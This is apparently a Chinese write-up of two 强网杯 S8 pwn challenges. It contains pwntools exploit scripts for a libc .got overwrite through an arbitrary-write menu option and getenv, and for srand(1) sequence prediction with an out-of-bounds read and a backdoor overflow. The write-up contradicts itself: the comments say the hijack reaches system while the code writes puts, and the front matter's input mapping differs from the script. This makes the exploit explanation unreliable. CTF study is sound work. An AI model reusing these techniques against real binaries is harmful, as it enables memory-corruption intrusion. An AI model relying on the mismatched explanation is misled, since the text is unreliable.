---
title: 强网杯 S8 初赛 PWN 赛题解析
contest: 强网杯
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags: [menu-heap, libc-got-overwrite, write-what-where, getenv, srand-1, expect-number, brute-force-sequence, env, PIE-low-entropy]
attack_chain:
  - 题目 1 (菜单 PWN): 6 个功能 add/free/edit/show/env/write
  - 漏洞: write(6) 任意地址写 + env(5) 调 getenv
  - 利用: 申请 4 个 0x500 chunk + free(1) + free(3) + show(3) 泄 libc
  - libc_addr = u64 - 0x21ace0
  - write(libc + 0x21a118, libc + puts) 改 libc .got
  - env(2) 触发 getenv 调用走篡改的 .got 跳 system
  - 题目 2 (expect_number): srand(1) 产生确定性序列 4 3 2 4 2 4 3 1 2 2 3 4 3 4 4 3...
  - 操作堆栈到 0x60 target + 越界读泄 code base
  - 4 = 累加 2, 3 = 输入 1, 2 = 输入 0
  - 后期: 4/2 = 输入 0, 1/3 = 输入 1
  - choice=2 退出后 recv until k 越界读 → addr = u64 - 0x4c60 (code base)
  - choice=4 触发 'Tell me your favorite number' 接收 payload
  - payload = b'\x00'*0x20 + p64(addr+0x5080) + p64(addr+0x251A) 改后门
key_payload: 'libc.got overwrite + env getenv + srand(1) 序列预测 + choice=4 后门调用'
one_liner: 强网杯 S8 PWN 双题：菜单 PWN 改 libc.got 触发 env(getenv) + expect_number srand(1) 序列预测 + 越界读 code base。
lesson: getenv() 内部调用 libc 函数可被 .got 劫持；srand(1) 固定序列爆破是简单 PWN 题常见套路。
quality: high
---

# 强网杯 S8 初赛 PWN 赛题解析

**来源**: ctfiot.com ID 218976
**作者**: 看雪 ID `xi@0ji233`

## 题目 1：菜单 PWN

### 菜单
```python
def choice(ch): p.sendlineafter("choice:", str(ch))
def add(size): choice(1); p.sendlineafter('size', str(size))
def free(idx): choice(2); p.sendlineafter('delete:', str(idx))
def edit(idx, payload): choice(3); p.sendlineafter('edit:', str(idx))
def show(idx): choice(4); p.sendlineafter('show:', str(idx))
def env(ch): choice(5); p.sendlineafter('sad !', str(ch))   # getenv 触发
def write(addr1, payload): choice(6); p.sendafter('addr', p64(addr1)); p.send(payload)  # 任意地址写
```

### 利用
```python
add(0x500)
add(0x500)
add(0x500)
add(0x500)
free(1)
free(3)
show(3)  # 泄 libc

libc_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x21ace0

# 改 libc .got
write(libc_addr + 0x21a118, p64(libc_addr + libc.sym['puts']))

# 触发 env(2) → getenv("...") → 走篡改的 .got → system
env(2)
```

### 核心
- `write(6)` 是任意地址写
- `env(5)` 调用 libc 的 getenv
- getenv 内部用 `__add_to_environ` 等函数，被篡改的 .got 触发 system
- libc.got 偏移 0x21a118 是 getenv 调用的某个内部函数

## 题目 2：expect_number (srand 预测)

### 序列生成
```c
srand(1);
for (int i = 0; i < 288; i++) {
    printf("%d ", rand() % 4 + 1);  // 1-4 范围
}
```

### 序列
```
4 3 2 4 2 4 3 1 2 2 3 4 3 4 4 3 1 3 1 1 4 1 4 2 3 3 3 4 4 4 2 3 3 3 2 4 2 1 4 3 2 2 2 4 1 2 3 1 4 3 2 3 4 1 1 2 3 3 1 2 2 2 1 4 1 2 3 2 2 2 1 4 3 2 3 4 3 1 4 3 4 1 1 3 1 1 4 4 3 4 1 1 1 1 4 1 3 3 3 4 4 3 3 3 4 2 2 3 2 1 1 1 2 1 3 2 2 2 1 4 1 2 4 2 2 4 2 4 2 4 4 1 2 2 3 2 3 4 4 1 1 4 1 2 4 4 3 1 1 4 1 2 1 4 3 2 3 4 2 4 4 1 1 1 2 3 2 1 3 1 1 3 4 1 4 4 4 2 4 1 1 4 2 1 4 4 3 2 3 4 2 2 4 2 3 1 4 4 1 2 1 1 4 4 2 3 3 1 1 3 1 1 2 2 2 1 1 4 3 4 3 4 1 2 1 3 2 4 3 3 2 3 3 1 2 4 4 1 1 4 3 1 4 4 3 1 1 3 4 3 2 2 2 3 3 2 1 1 1 3 3 2 1 1 3 3 1 2 3 1 1 1 1 4 4 3 1 4 2 4 2 3 2 3 1 4 4 2
```

### 利用脚本
```python
seq = "4 3 2 4 2 4 3 1 2 2 3 4 3 4 4 3 1 3 1 1 4 1 4 2 3 3 3 4 4 4 2 3 3 3 2 4 2 1 4 3 2 2 2 4 1 2 3 1 4 3 2 3 4 1 1 2 3 3 1 2 2 2 1 4 1 2 3 2 2 2 1 4 3 2 3 4 3 1 4 3 4 1 1 3 1 1 4 4 3 4 1 1 1 1 4 1 3 3 3 4 4 3 3 3 4 2 2 3 2 1 1 1 2 1 3 2 2 2 1 4 1 2 4 2 2 4 2 4 2 4 4 1 2 2 3 2 3 4 4 1 1 4 1 2 4 4 3 1 1 4 1 2 1 4 3 2 3 4 2 4 4 1 1 1 2 3 2 1 3 1 1 3 4 1 4 4 4 2 4 1 1 4 2 1 4 4 3 2 3 4 2 2 4 2 3 1 4 4 1 2 1 1 4 4 2 3 3 1 1 3 1 1 2 2 2 1 1 4 3 4 3 4 1 2 1 3 2 4 3 3 2 3 3 1 2 4 4 1 1 4 3 1 4 4 3 1 1 3 4 3 2 2 2 3 3 2 1 1 1 3 3 2 1 1 3 3 1 2 3 1 1 1 1 4 4 3 1 4 2 4 2 3 2 3 1 4 4 2".split(' ')
seqnum = [int(i) for i in seq]

target = 0x60
now = 0
ch = 0
k = ''

# 阶段 1: 操作堆栈到 0x60 target
for i in seqnum:
    p.sendlineafter('choice ', '1')
    if i == 1:
        k += '2'; now += 2
        p.sendlineafter('or 0', str(2))
    elif i == 2:
        k += '0'
        p.sendlineafter('or 0', str(0))
    else:
        k += '1'
        p.sendlineafter('or 0', str(1))
    ch += 1
    if now == target: break

# 阶段 2: 后期填充
for i in seqnum[ch:-0xc]:
    p.sendlineafter('choice ', '1')
    if i == 1 or i == 2:
        p.sendlineafter('or 0', str(0)); k += '0'
    else:
        p.sendlineafter('or 0', str(1)); k += '1'

# 阶段 3: 退出泄 code base
p.sendlineafter('choice ', '2')
p.recvuntil(k)
addr = u64(p.recv(6) + b'\x00\x00') - 0x4c60
success('code: ' + hex(addr))

# 阶段 4: 触发后门
payload = b'\x00' * 0x20 + p64(addr + 0x5080) + p64(addr + 0x251A)
p.sendlineafter('choice ', '4')
p.sendafter('Tell me your favorite number.', payload)
p.interactive()
```

## 评价
强网杯 S8 两道 PWN：
1. **菜单 PWN**：利用 write(6) 任意地址写 + env(5) 触发 getenv 内部函数 libc.got 改写
2. **expect_number**：srand(1) 固定序列 + 堆栈操作到 0x60 + 越界读泄 code base + 触发后门

考察 libc 内部函数调用链（getenv）作为攻击面 + 固定 srand 序列爆破。`xi@0ji233` 大佬的经典 PWN 攻击思路。
